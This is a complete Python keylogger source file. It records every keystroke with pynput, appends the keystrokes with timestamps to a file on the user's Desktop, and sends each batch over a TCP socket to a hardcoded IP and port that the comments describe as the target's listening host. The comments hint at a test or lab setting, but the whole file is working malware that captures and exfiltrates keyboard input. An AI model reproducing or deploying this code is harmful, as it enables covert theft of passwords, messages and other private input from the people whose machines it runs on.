import os
import socket
from pynput.keyboard import Key, Listener
from datetime import datetime

# file path where logs will be saved in the target machine (is not necessay but just test case)
log_file = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")

# List to store keys
keys = []

# Server configuration
SERVER_IP = '192.168.240.147'  # Subject to target IP
SERVER_PORT = 65432        # listeneing port on Host

# Function to send logs to the server
def send_logs_to_server(log_data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, SERVER_PORT))
            client_socket.sendall(log_data.encode('utf-8'))
    except Exception as e:
        print(f"error sending logs: {e}")

# Function to write the keys to the log file
def write_to_file(keys):
    try:
        log_data = ""
        for key in keys:
            if isinstance(key, Key):
                if key == Key.space:
                    log_data += " "
                elif key == Key.enter:
                    log_data += "\n"
                elif key == Key.tab:
                    log_data += "\t"
                elif key == Key.backspace:
                    log_data += "[BACKSPACE]"
                else:
                    log_data += f"[{key.name.upper()}]"
            else:
                log_data += key
        log_data += "\n"

        # Get current date and time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Format: Log on left side and time on the right
        log_entry = f"{log_data.strip()} {current_time}"

        # Append logs to the local file
        with open(log_file, 'a') as file:
            file.write(log_entry + "\n")

        # Send logs to the server
        send_logs_to_server(log_entry)

    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to handle key press events
def on_press(key):
    global keys
    try:
        if hasattr(key, 'char') and key.char is not None:
            keys.append(key.char)
        else:
            keys.append(str(key))
    except AttributeError:
        keys.append(str(key))

    if len(keys) >= 10 :  # Buffer to write to file every 10 keys
        write_to_file(keys)
        keys = []

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()